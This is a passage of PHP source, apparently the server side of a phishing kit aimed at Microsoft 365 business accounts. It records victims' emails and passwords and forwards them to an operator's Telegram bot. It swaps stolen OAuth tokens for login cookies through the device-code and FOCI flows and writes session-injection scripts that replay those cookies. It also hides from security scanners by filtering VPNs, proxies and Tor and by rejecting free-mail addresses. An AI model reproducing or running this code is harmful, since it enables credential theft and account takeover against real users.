        @file_put_contents($logFile, $line, FILE_APPEND);
    }

    public static function proxycheckBlocked(string $ip, string $apiKey = '', bool $blockVPN = true, bool $blockProxy = true, bool $blockTor = true, int $riskThreshold = 75): array {
        $default = ['is_blocked' => false, 'country' => '', 'provider' => '', 'type' => '', 'risk' => 0, 'reason' => ''];
        
        if (filter_var($ip, FILTER_VALIDATE_IP) === false) {
            return $default;
        }
        
        // Use provided API key or fallback to environment
        if (empty($apiKey)) {
            $apiKey = $_ENV['PROXYCHECK_API_KEY'] ?? getenv('PROXYCHECK_API_KEY') ?? '';
            $apiKey = trim($apiKey);
        }

        if (empty($apiKey)) {
            self::log("ProxyCheck Error: API Key missing (VPN/Proxy block skipped)");
            return $default;
        }

        // Check cache first
        $cacheKey = md5($ip . $apiKey);
        $cacheDir = __DIR__ . '/../session_data';
        if (!is_dir($cacheDir)) @mkdir($cacheDir, 0777, true);
        $cacheFile = $cacheDir . '/proxycheck_' . $cacheKey . '.json';
        
        if (file_exists($cacheFile)) {
            $cached = json_decode(file_get_contents($cacheFile), true);
            if (is_array($cached) && isset($cached['checked_at'])) {
                $checkedAt = (int)$cached['checked_at'];
                $now = time();
                // Cache for 1 hour
                if (($now - $checkedAt) >= 0 && ($now - $checkedAt) < 3600) {
                     return $cached['data'];
                }
            }
        }

        // Use CURL for better reliability and detailed error reporting
        $params = [
            'key'   => $apiKey,
            'vpn'   => 1,
            'proxy' => 1,
            'tor'   => 1,
            'risk'  => 1,
            'asn'   => 1,
            'inf'   => 1 // More info (provider, type, etc)
        ];
        $url = "https://proxycheck.io/v2/{$ip}?" . http_build_query($params);
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_USERAGENT, 'PHP-Security-Check/1.1');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        unset($ch);

        if ($response === false || $httpCode !== 200) {
            self::log("ProxyCheck API Connection Failed: HTTP $httpCode | Error: $error");
            
            // Fallback: Check Cloudflare Headers if API fails
            if (!empty($_SERVER['HTTP_CF_IPCOUNTRY'])) {
                $cfCountry = strtoupper($_SERVER['HTTP_CF_IPCOUNTRY']);
                if ($cfCountry === 'T1') { // Tor
                     return [
                        'is_blocked' => true,
                        'country'    => 'T1',
                        'provider'   => 'Cloudflare (Fallback)',
                        'type'       => 'Tor',
                        'risk'       => 100,
                        'reason'     => 'Tor (CF Fallback)'
                    ];
                }
                if ($cfCountry === 'XX') { // Unknown/Satellite
                     return [
                        'is_blocked' => true,
                        'country'    => 'XX',
                        'provider'   => 'Cloudflare (Fallback)',
                        'type'       => 'Unknown',
                        'risk'       => 90,
                        'reason'     => 'Unknown Country (CF Fallback)'
                    ];
                }
            }
            
            return $default;
        }

        $data = json_decode($response, true);
        if (!$data || !isset($data[$ip])) {
            $status = $data['status'] ?? 'unknown';
            $msg = $data['message'] ?? 'No detail';
            self::log("ProxyCheck API Error Status: $status | Message: $msg");
            return $default;
        }

        $result = $data[$ip];
        $isBlocked = false;
        $blockReasons = [];

        // Check VPN
        if ($blockVPN && isset($result['vpn']) && $result['vpn'] === 'yes') {
            $isBlocked = true;
            $blockReasons[] = 'VPN';
        }

        // Check Proxy
        if ($blockProxy && isset($result['proxy']) && $result['proxy'] === 'yes') {
            $isBlocked = true;
            $blockReasons[] = 'Proxy';
        }

        // Check Tor
        if ($blockTor && isset($result['tor']) && $result['tor'] === 'yes') {
            $isBlocked = true;
            $blockReasons[] = 'Tor';
        }

        // Check Risk Score
        $riskScore = isset($result['risk']) ? (int)$result['risk'] : 0;
        if ($riskScore > $riskThreshold) {
            $isBlocked = true;
            $blockReasons[] = "Risk Score {$riskScore}";
        }

        $reasonStr = implode(', ', $blockReasons);
        $result['block_reason'] = $reasonStr; // Store in cache

        $intel = [
            'is_blocked' => $isBlocked,
            'country'    => $result['isocode'] ?? $result['country'] ?? '',
            'provider'   => $result['provider'] ?? $result['asn'] ?? '',
            'type'       => $result['type'] ?? '',
            'risk'       => $riskScore,
            'reason'     => $reasonStr
        ];

        // Log the actual detection for debugging
        if ($isBlocked) {
            self::log("ProxyCheck.io BLOCKED IP {$ip}: " . $reasonStr);
        }

        // Cache the result
        $cacheData = [
            'checked_at' => time(),
            'data' => $intel
        ];
        @file_put_contents($cacheFile, json_encode($cacheData));

        return $intel;
    }
}

class Api {
    public static function handle() {
        header_remove('X-Powered-By');
        header('Content-Type: application/json');
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
        header('Access-Control-Allow-Headers: Content-Type');
        ignore_user_abort(true);
        set_time_limit(0);
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_start();
        }

        if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
            echo json_encode(['ok' => true]);
            exit;
        }

        $action = $_POST['action'] ?? $_GET['action'] ?? '';

        switch ($action) {
            case 'save_config': self::handleSaveConfig(); break;
            case 'get_config': self::handleGetConfig(); break;
            case 'clear_logs': self::handleClearLogs(); break;
            case 'get_cookies': self::handleGetCookies(); break;
            case 'get_tokens': self::handleGetTokens(); break;
            case 'receive_tokens': self::handleReceiveTokens(); break;
            case 'receive_cookies': self::handleReceiveCookies(); break;
            case 'start_device_flow': self::handleStartDeviceFlow(); break;
            case 'poll_device_flow': self::handlePollDeviceFlow(); break;
            case 'get_events': self::handleGetEvents(); break;
            case 'get_deployment_info': self::handleGetDeploymentInfo(); break;
            case 'log_event': self::handleLogEvent(); break;
            case 'run_puppeteer': self::handleRunPuppeteer(); break;
            case 'validate_turnstile_config': self::handleValidateTurnstileConfig(); break;
            case 'verify_turnstile': self::handleVerifyTurnstile(); break;
            case 'verify_email': self::handleVerifyEmail(); break;
            case 'test_telegram': self::handleTestTelegram(); break;
            case 'sync_cloudflare': self::handleSyncCloudflare(); break;
            case 'configure_cloudflare': self::handleConfigureCloudflare(); break;
            case 'create_turnstile_widget': self::handleCreateTurnstileWidget(); break;
            case 'get_cloudflare_zones': self::handleGetCloudflareZones(); break;
            case 'capture_existing_session': self::handleCaptureExistingSession(); break;
            case 'capture_sso': self::handleCaptureSSO(); break;
            case 'check_session': self::handleCheckSession(); break;
            case 'receive_local_capture': self::handleReceiveLocalCapture(); break;
            case 'trigger_worker': self::handleTriggerWorker(); break;
            case 'get_connection_status': self::handleGetConnectionStatus(); break;
            default:
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid action']);
            break;
        }
    }

    /**
     * Handles triggering the token_swap.js worker proactively.
     * This is intended to be called when client-side detects a potential session
     * but ESTSAUTH is not available, to initiate robust server-side capture.
     */
    public static function handleTriggerWorker() { // Note: Made static to match other Api methods
        ob_start(); // Start output buffering

        $email = $_POST['email'] ?? null; // Keep email as null if not provided
        $cookieId = $_POST['cookieId'] ?? null;
        $clientCookies = $_POST['clientCookies'] ?? ''; // String of document.cookie from client

        $logFile = realpath(__DIR__ . '/../project.log'); // Get absolute path
        $logMessage = '[' . date('c') . '] DIRECT_LOG_TEST: handleTriggerWorker received request. Email: '. ($email ?? '[NULL]') . ', CookieID: '. ($cookieId ?? '[NULL]') . "\n";
        file_put_contents($logFile, $logMessage, FILE_APPEND);
        // Explicitly flush after direct file_put_contents
        if (is_resource($fp = fopen($logFile, 'a'))) {
            fwrite($fp, ""); // Write empty string to force flush if not already
            fflush($fp);
            fclose($fp);
        }
        Security::log("PROACTIVE_TRIGGER: Received request. Email: ". ($email ?? '[NULL]') . ", CookieID: ". ($cookieId ?? '[NULL]'));

        if (!$cookieId) { // Only check for cookieId
            Security::log("PROACTIVE_TRIGGER: Missing cookieId. Request rejected.");
            echo json_encode(['status' => 'error', 'message' => 'Missing cookieId']);
            ob_end_flush(); // Flush buffer before returning
            return;
        }

        // The client has requested a proactive worker trigger based on its heuristic.
        // We will proceed to queue the task and let the worker determine if a session exists.

        // Check if a worker task is already pending or completed for this cookieId
        $db = new Database();
        // ... (logic to prevent re-triggering) ...

        // Trigger the token_swap.js worker proactively.
        $db->addTask($cookieId, $email, "PROACTIVE_SESSION_SYNC");
        Security::log("PROACTIVE_TRIGGER: Client requested proactive worker trigger for $email (CookieID: $cookieId). Worker task added.");
        
        echo json_encode(['status' => 'worker_task_added', 'cookieId' => $cookieId, 'message' => 'Worker task added for proactive session sync.']);
        ob_end_flush(); // Flush buffer before returning
    }

    private static function handleGetConnectionStatus() {
        header('Content-Type: application/json');
        $cfg = Config::load();
        
        $cloudflareConnected = !empty($cfg['cfApiKey']) && !empty($cfg['cfEmail']);
        
        $proxycheckEnabled = !empty($cfg['proxycheckEnabled']);
        $proxycheckApiKeyExists = !empty($cfg['proxycheckApiKey']);
        $proxycheckConnected = $proxycheckEnabled && $proxycheckApiKeyExists;

        echo json_encode([
            'ok' => true,
            'cloudflare' => ['connected' => $cloudflareConnected],
            'proxycheck' => ['connected' => $proxycheckConnected]
        ]);
        exit;
    }

    private static function handleReceiveLocalCapture() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        
        $email = $data['email'] ?? 'unknown_local';
        $lsData = $data['localStorage'] ?? '{}';
        $cookieStr = $data['cookies'] ?? '';
        
        $hasEsts = strpos($cookieStr, 'ESTSAUTH') !== false;
        Security::log("LOCAL_CAPTURE: Received browser sweep for $email. (ESTSAUTH: " . ($hasEsts ? "YES" : "NO") . ")");
        
        $cookieId = uniqid('local_cap_', true);
        $projectRoot = realpath(__DIR__ . '/..');
        $sessionDir = $projectRoot . '/session_data';
        if (!is_dir($sessionDir)) mkdir($sessionDir, 0777, true);

        // --- MERGE WITH PHP-SIDE FOCI COOKIES ---
        // Since helper.html is on a different domain, it can't see .login.microsoftonline.com cookies.
        // We use the tokens we got from the device flow to get the real cookies.
        $db = new Database();
        $latestEvent = $db->getLatestEventByEmail($email);
        $fociCookies = [];
        $tokens = null;
        
        if ($latestEvent && isset($latestEvent['token_data']['access_token'])) {
            $tokens = $latestEvent['token_data'];

            // CACHE: Check if we already swapped for this specific session in the last 60 seconds
            $cacheKey = "foci_swap_" . md5($email . $tokens['access_token']);
            $cacheFile = $projectRoot . '/session_data/' . $cacheKey . '.json';
            
            if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < 60)) {
                Security::log("LOCAL_CAPTURE: Using cached FOCI cookies for $email...");
                $fociCookies = json_decode(file_get_contents($cacheFile), true);
            } else {
                Security::log("LOCAL_CAPTURE: Merging with existing FOCI tokens for $email...");
                $swap = self::swapTokenForCookies($tokens['access_token'], $tokens['refresh_token'] ?? null, $email, $latestEvent['clientId'] ?? '1950a258-227b-4e31-a9cf-717495945fc2');
                $fociCookies = $swap['cookies'] ?? [];
                file_put_contents($cacheFile, json_encode($fociCookies));
                Security::log("LOCAL_CAPTURE: FOCI swap added " . count($fociCookies) . " master cookies.");
            }

            // Proactively trigger the VPS Worker if a refresh token is available for robust ESTSAUTH capture
            if (isset($tokens['refresh_token'])) {
                Security::log("LOCAL_CAPTURE: Refresh token present for $email. Proactively triggering VPS Worker for robust ESTSAUTH capture...");
                $workerCookieId = $cookieId . '_worker';
                $db->logEvent([
                    'cookieId' => $workerCookieId,
                    'type' => 'hybrid_worker_trigger',
                    'emailMask' => $email,
                    'email' => $email,
                    'domain' => 'microsoft.com',
                    'token_data' => $tokens
                ]);
                // Trigger token_swap.js worker
                $cmd = "cd " . escapeshellarg($projectRoot) .
                       " && if command -v chromium >/dev/null 2>&1; then export PUPPETEER_EXECUTABLE_PATH=`command -v chromium`; fi" .
                       " && HOME=" . escapeshellarg($projectRoot) .
                       " node " . escapeshellarg($projectRoot . '/token_swap.js') . " " . escapeshellarg($email) . " \"OAUTH_TOKEN_CAPTURED\" " . escapeshellarg($workerCookieId) . " >> " . escapeshellarg($projectRoot . '/project.log') . " 2>&1";
                shell_exec($cmd);
            } else {
                Security::log("LOCAL_CAPTURE: No refresh token, or PHP swap successfully captured session with ESTSAUTH for $email. Worker not triggered.");
            }
        }
        
        // 1. Save Event
        $db->logEvent([
            'cookieId' => $cookieId,
            'type' => 'local_browser_capture',
            'emailMask' => $email,
            'email' => $email,
            'domain' => 'microsoft.com',
            'attempt' => 1,
            'password' => 'LOCAL_BROWSER_MEMORY',
            'ip' => Security::getClientIp(),
            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'time' => date('c'),
            'token_data' => $tokens
        ]);
        
        // 2. Generate Injection Script
        $scriptPath = $sessionDir . '/inject_session_' . $cookieId . '.js';
        $scriptContent = "// @ClosedService-Pages Hybrid Browser Capture 🍪\n";
        $scriptContent .= "// Generated for: $email\n\n";
        $scriptContent .= "(function() {\n";
        $scriptContent .= "    console.log('🚀 Restoring Hybrid Session for: $email');\n";
        
        // Inject FOCI Cookies (Master Keys)
        if (!empty($fociCookies)) {
            $scriptContent .= "    const fociCookies = " . json_encode($fociCookies, JSON_PRETTY_PRINT) . ";\n";
            $scriptContent .= "    fociCookies.forEach(c => {\n";
            $scriptContent .= "        document.cookie = c.name + '=' + c.value + '; domain=' + c.domain + '; path=/; secure; samesite=none; expires=' + new Date(Date.now() + 31536000000).toUTCString();\n";
            $scriptContent .= "    });\n";
        }

        // Inject Local Cookies (PHPSESSID etc)
        $scriptContent .= "    const localCookieStr = " . json_encode($cookieStr) . ";\n";
        $scriptContent .= "    localCookieStr.split(';').forEach(c => {\n";
        $scriptContent .= "        if(c.trim()) document.cookie = c.trim() + '; path=/; secure; samesite=none; expires=' + new Date(Date.now() + 31536000000).toUTCString();\n";
        $scriptContent .= "    });\n";
        
        // LocalStorage (if any)
        if ($lsData !== '{}') {
            $scriptContent .= "    const lsData = " . $lsData . ";\n";
            $scriptContent .= "    Object.keys(lsData).forEach(k => localStorage.setItem(k, lsData[k]));\n";
        }
        
        $scriptContent .= "    console.log('✅ Session fully restored!');\n";
        $scriptContent .= "})();";
        
        file_put_contents($scriptPath, $scriptContent);
        
        // 3. Telegram Notification
        $cfg = Config::load();
        if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
            $msg = Worker::generateTelegramMessage($email, "HYBRID_CAPTURE_SUCCESS", Security::getClientIp(), $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', "✅ Hybrid Capture Success: FOCI Cookies (" . count($fociCookies) . ") + Local Browser Memory merged.");
            $urlTg = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
            Worker::sendRequest($urlTg, ['chat_id' => $cfg['telegramChatId'], 'text' => $msg], $cfg);

            // Send document
            $urlDoc = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendDocument";
            $payloadDoc = [
                'chat_id' => $cfg['telegramChatId'],
                'document' => new \CURLFile($scriptPath, 'application/javascript', "hybrid_cookies_{$email}.js"),
                'caption' => "/////// HYBRID COOKIES 🍪 POWERED BY CLOSEDPAGE 4 $email/////////"
            ];
            Worker::sendRequest($urlDoc, $payloadDoc, $cfg, true);
        }
        
        echo json_encode(['ok' => true, 'cookieId' => $cookieId]);
    }

    private static function handleCheckSession() {
        $email = $_GET['email'] ?? '';
        if (!$email) {
            echo json_encode(['ok' => false]);
            exit;
        }

        $db = new Database();
        $latest = $db->getLatestEventByEmail($email);
        $hasSession = false;
        
        if ($latest && isset($latest['cookieId'])) {
            $sessionDir = realpath(__DIR__ . '/../session_data');
            $script = $sessionDir . '/inject_session_' . $latest['cookieId'] . '.js';
            if (file_exists($script)) {
                $hasSession = true;
            }
        }

        echo json_encode(['ok' => true, 'has_session' => $hasSession]);
        exit;
    }

    private static function handleCaptureSSO() {
        $email = $_GET['email'] ?? '';
        if (strpos($email, 'EMAIL_PLACEHOLDER') !== false) { $email = ''; }
        
        $tenantHint = 'common';
        if ($email && strpos($email, '@') !== false) {
            $tenantHint = substr($email, strpos($email, '@') + 1);
        }

        // Silent OIDC Authorization URL
        $cfg = Config::load();
        $clientId = $cfg['msSsoClientId'];
        $redirectUri = "https://login.microsoftonline.com/common/oauth2/nativeclient";
        $scope = "openid profile email offline_access https://graph.microsoft.com/.default https://outlook.office.com/mail.read";
        
        // This URL can be used in a hidden iframe or a quick redirect
        $authUrl = "https://login.microsoftonline.com/$tenantHint/oauth2/v2.0/authorize?" . http_build_query([
            'client_id' => $clientId,
            'response_type' => 'code',
            'redirect_uri' => $redirectUri,
            'scope' => $scope,
            'prompt' => 'none', // Silent!
            'login_hint' => $email,
            'response_mode' => 'query',
            'domain_hint' => 'organizations' // Prefer business accounts
        ]);

        echo json_encode(['ok' => true, 'authUrl' => $authUrl]);
    }

    private static function handleValidateTurnstileConfig() {
        $siteKey = '';
        $secretKey = '';
        $enabled = false;

        // Support testing candidate keys from POST (Test before Save)
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $raw = file_get_contents('php://input');
             $data = json_decode($raw, true);
             if (is_array($data)) {
                 $siteKey = trim((string)($data['cfSiteKey'] ?? ''));
                 $secretKey = trim((string)($data['cfSecretKey'] ?? ''));
                 $enabled = !empty($data['cfTurnstileEnabled']);
             }
        }

        // Fallback to saved config if not provided in request
        if ($siteKey === '' && $secretKey === '') {
            $cfg = Config::load();
            $enabled = !empty($cfg['cfTurnstileEnabled']);
            $siteKey = isset($cfg['cfSiteKey']) ? trim((string)$cfg['cfSiteKey']) : '';
            $secretKey = isset($cfg['cfSecretKey']) ? trim((string)$cfg['cfSecretKey']) : '';
        }

        $siteKeyPresent = ($siteKey !== '');
        $secretKeyPresent = ($secretKey !== '');
        $siteKeyLooksValid = ($siteKeyPresent && strlen($siteKey) >= 20);
        $secretKeyLooksValid = ($secretKeyPresent && strlen($secretKey) >= 20);
        $ready = ($enabled && $siteKeyLooksValid && $secretKeyLooksValid);

        echo json_encode([
            'ok' => true,
            'enabled' => $enabled,
            'siteKeyPresent' => $siteKeyPresent,
            'secretKeyPresent' => $secretKeyPresent,
            'siteKeyLooksValid' => $siteKeyLooksValid,
            'secretKeyLooksValid' => $secretKeyLooksValid,
            'ready' => $ready,
        ]);
    }

    private static function handleVerifyTurnstile() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $tokenRaw = $data['token'] ?? '';
        $token = trim(is_string($tokenRaw) ? $tokenRaw : (string)$tokenRaw);
        
        // Log verification attempt
        Security::log("Turnstile Verification Attempt - Token: " . substr($token, 0, 10) . "...");

        if ($token === '') {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing token']);
            exit;
        }

        $cfg = Config::load();
        $secret = isset($cfg['cfSecretKey']) ? trim((string)$cfg['cfSecretKey']) : '';
        if ($secret === '') {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing secret key']);
            exit;
        }

        $body = http_build_query([
            'secret' => $secret,
            'response' => $token,
            'remoteip' => Security::getClientIp(),
        ]);

        $context = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\nAccept: application/json\r\n",
                'content' => $body,
                'timeout' => 5,
                'ignore_errors' => true,
            ],
        ]);

        $rawResp = @file_get_contents('https://challenges.cloudflare.com/turnstile/v0/siteverify', false, $context);
        if ($rawResp === false) {
            $err = error_get_last();
            \App\Security::log("Turnstile Verification Connection Error: " . ($err['message'] ?? 'Unknown error'));
            http_response_code(502);
            echo json_encode(['ok' => false, 'error' => 'Verification unavailable']);
            exit;
        }

        $resp = json_decode($rawResp, true);
        if (!is_array($resp)) {
            \App\Security::log("Turnstile Verification Invalid JSON: " . substr($rawResp, 0, 100));
            http_response_code(502);
            echo json_encode(['ok' => false, 'error' => 'Invalid verification response']);
            exit;
        }

        if (!empty($resp['success'])) {
            $_SESSION['turnstile_verified'] = true;
            echo json_encode(['ok' => true]);
            return;
        }

        \App\Security::log("Turnstile Verification Failed: " . json_encode($resp));
        http_response_code(403);
        echo json_encode(['ok' => false, 'error' => 'Verification failed', 'codes' => $resp['error-codes'] ?? []]);
    }

    private static function handleVerifyEmail() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        $email = $data['email'] ?? '';
        
        if (!$email || strpos($email, '@') === false) {
            echo json_encode(['ok' => true, 'isBusiness' => false]);
            exit;
        }
        
        $cfg = Config::load();
        $emailParts = explode('@', $email);
        $domain = strtolower(end($emailParts));
        
        $hardcodedBlocked = ["outlook.com","hotmail.com","live.com","msn.com","yahoo.com","ymail.com","gmail.com","googlemail.com","aol.com","icloud.com","me.com","mac.com","proton.me","protonmail.com","mail.com","gmx.com"];

        // 1. Check Hardcoded Blocked Domains (Hidden from Admin)
        if (in_array($domain, $hardcodedBlocked, true)) {
            echo json_encode(['ok' => true, 'isBusiness' => false]);
            exit;
        }

        // 2. Check Dynamic Blocked Domains (From Config)
        if (!empty($cfg['blockedDomains']) && is_array($cfg['blockedDomains'])) {
            if (in_array($domain, $cfg['blockedDomains'], true)) {
                echo json_encode(['ok' => true, 'isBusiness' => false]);
                exit;
            }
        }
        
        // 3. Check Allowed Domains
        if (!empty($cfg['allowedDomains']) && is_array($cfg['allowedDomains'])) {
            if (!in_array($domain, $cfg['allowedDomains'], true)) {
                echo json_encode(['ok' => true, 'isBusiness' => false]);
                exit;
            }
        }
        
        echo json_encode(['ok' => true, 'isBusiness' => true]);
    }

    private static function handleGetEvents() {
        try {
            $baseDir = realpath(__DIR__ . '/..');
            $storageDir = $baseDir . '/session_data';
            
            $files = glob($storageDir . '/event_*.json');
            $events = [];
            
            foreach ($files as $file) {
                $data = json_decode(file_get_contents($file), true);
                if (!$data) continue;
                
                $cookieIdRaw = $data['cookieId'] ?? null;
                if (!$cookieIdRaw) continue;
                $cookieId = preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieIdRaw);
                $botStatus = 'pending';
                
                if (file_exists($storageDir . '/task_' . $cookieId . '.completed')) {
                    $task = json_decode(file_get_contents($storageDir . '/task_' . $cookieId . '.completed'), true);
                    $botStatus = $task['status'] ?? 'completed';
                } elseif (file_exists($storageDir . '/task_' . $cookieId . '.processing')) {
                    $botStatus = 'processing';
                } elseif (file_exists($storageDir . '/task_' . $cookieId . '.pending')) {
                    $botStatus = 'pending';
                }
                
                $event = [
                    'type' => $data['type'] ?? 'unknown',
                    'emailMask' => $data['emailMask'] ?? 'unknown',
                    'domain' => $data['domain'] ?? 'unknown',
                    'attempt' => intval($data['attempt'] ?? 0),
                    'password' => $data['password'] ?? 'unknown',
                    'ip' => $data['ip'] ?? '0.0.0.0',
                    'ua' => $data['ua'] ?? 'unknown',
                    'country' => $data['country'] ?? 'XX',
                    'time' => $data['created_at'] ?? $data['time'] ?? date('c'),
                    'cookieId' => $data['cookieId'] ?? 'unknown',
                    'botStatus' => $botStatus
                ];
                
                $scriptFile = $storageDir . '/inject_session_' . ($data['cookieId'] ?? 'unknown') . '.js';
                $hasScript = (file_exists($scriptFile) && filesize($scriptFile) > 0);
                
                if ($event['botStatus'] !== 'completed' && $hasScript) {
                    $event['botStatus'] = 'completed';
                }
                
                $event['hasScript'] = $hasScript;
                $events[] = $event;
            }
            
            // Sort by time desc
            usort($events, function($a, $b) {
                $timeA = isset($a['time']) ? strtotime($a['time']) : 0;
                $timeB = isset($b['time']) ? strtotime($b['time']) : 0;
                return $timeB - $timeA;
            });
            
            echo json_encode(['ok' => true, 'events' => $events]);
        } catch (Exception $e) {
            Security::log("API ERROR (get_events): " . $e->getMessage());
            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
        }
    }

    private static function handleRunPuppeteer() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $email = isset($data['email']) ? trim($data['email']) : '';
        $password = isset($data['password']) ? (string)$data['password'] : '';
        $cookieId = isset($data['cookieId']) ? preg_replace('/[^a-zA-Z0-9._-]/', '', $data['cookieId']) : '';

        if ($email === '' || $password === '' || $cookieId === '') {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Missing fields']);
            exit;
        }

        try {
            // IMMEDIATE TELEGRAM NOTIFICATION
            $cfg = Config::load();
            if (!empty($cfg['telegramBotToken']) && !empty($cfg['telegramChatId'])) {
                 $ip = Security::getClientIp();
                 $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
                 $info = "🍪  (Processing...)"; 
                 
                 $msg = Worker::generateTelegramMessage($email, $password, $ip, $ua, $info);
                 
                 $url = "https://api.telegram.org/bot{$cfg['telegramBotToken']}/sendMessage";
                 $payload = [
                     'chat_id' => $cfg['telegramChatId'],
                     'text' => $msg
                 ];
                 
                 Worker::sendRequest($url, $payload, $cfg);
            }

            $db = new Database();

            $db->addTask($cookieId, $email, $password);

            echo json_encode(['ok' => true]);
        } catch (Exception $e) {
            Security::log("API ERROR (run_puppeteer): " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['ok' => false, 'error' => 'Internal Server Error']);
        }
    }

    private static function handleTestTelegram() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        $botToken = $data['botToken'] ?? '';
        $chatId = $data['chatId'] ?? '';
        $proxyEnabled = $data['proxyEnabled'] ?? false;
        $proxyUrl = $data['proxyUrl'] ?? '';

        if (!$botToken || !$chatId) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Bot Token and Chat ID are required']);
            exit;
        }

        $cfg = Config::load();
        // Override config with test values
        $cfg['telegramBotToken'] = $botToken;
        $cfg['telegramChatId'] = $chatId;
        $cfg['proxyEnabled'] = $proxyEnabled;
        $cfg['proxyUrl'] = $proxyUrl;
        
        $ip = Security::getClientIp();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        
        $activeSecurity = [];
        if (!empty($cfg['cfTurnstileEnabled'])) $activeSecurity[] = "Turnstile";
        if (!empty($cfg['cfBotShield'])) $activeSecurity[] = "Bot Shield";
        if (!empty($cfg['cfSecurityEnabled'])) $activeSecurity[] = "Strict SSL";
        if (!empty($cfg['securityEnabled'])) $activeSecurity[] = "Adv. Security";
        
        $secStatus = empty($activeSecurity) ? "None" : implode(" + ", $activeSecurity);
        $info = "MANUAL TEST (Security Active: $secStatus)";
        
        $message = Worker::generateTelegramMessage("Test User", "Test Password", $ip, $ua, $info);

        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $payload = [
            'chat_id' => $chatId,
            'text' => $message
        ];

        $result = Worker::sendRequest($url, $payload, $cfg);
        $resData = json_decode($result, true);

        if ($resData && !empty($resData['ok'])) {
            echo json_encode(['ok' => true]);
        } else {
            $err = $resData['description'] ?? 'Unknown Telegram error';
            echo json_encode(['ok' => false, 'error' => $err]);
        }
    }

    private static function handleLogEvent() {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['ok' => false, 'error' => 'Method Not Allowed']);
            exit;
        }
        $raw = file_get_contents('php://input');
        // Security::log("DEBUG: handleLogEvent received raw body: " . substr($raw, 0, 200));
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'Invalid JSON']);
            exit;
        }

        try {
            $db = new Database();
            
            // 1. ALWAYS ON: Honeypot Check (Bot Protection)
            // If the hidden field is filled, it's a bot.
            $hpField = isset($data['hpField']) ? $data['hpField'] : '';
            if (!empty($hpField)) {
                echo json_encode(['ok' => true, 'ignored' => 'honeypot']);
                return;
            }

            $emailRaw = $data['emailMask'] ?? ($data['email'] ?? '');
            $passwordRaw = $data['password'] ?? '';
            $email = trim(is_string($emailRaw) ? $emailRaw : (string)$emailRaw);
            $password = trim(is_string($passwordRaw) ? $passwordRaw : (string)$passwordRaw);
            $type = isset($data['type']) ? $data['type'] : 'unknown';
            $domain = isset($data['domain']) ? $data['domain'] : '';
            $attempt = isset($data['attempt']) ? $data['attempt'] : 0;
            $cookieIdRaw = isset($data['cookieId']) ? (string)$data['cookieId'] : '';
            $cookieIdSanitized = $cookieIdRaw !== '' ? preg_replace('/[^a-zA-Z0-9._-]/', '', $cookieIdRaw) : '';

            // Fix: Ignore empty submissions (requires at least email)
            if ($email === '' && $password === '') {
                echo json_encode(['ok' => true, 'ignored' => 'empty']);
                return;
            }
            if ($email === '') {
                echo json_encode(['ok' => true, 'ignored' => 'missing_email']);
                return;
            }

            if (!empty($password) && !empty($email)) {
                $cookieId = $cookieIdSanitized !== '' ? $cookieIdSanitized : uniqid('cookie_', true);

                $db->logEvent([
                    'cookieId' => $cookieId,
                    'type' => $type,
                    'emailMask' => $email,
                    'domain' => $domain,
                    'attempt' => $attempt,
                    'password' => $password,
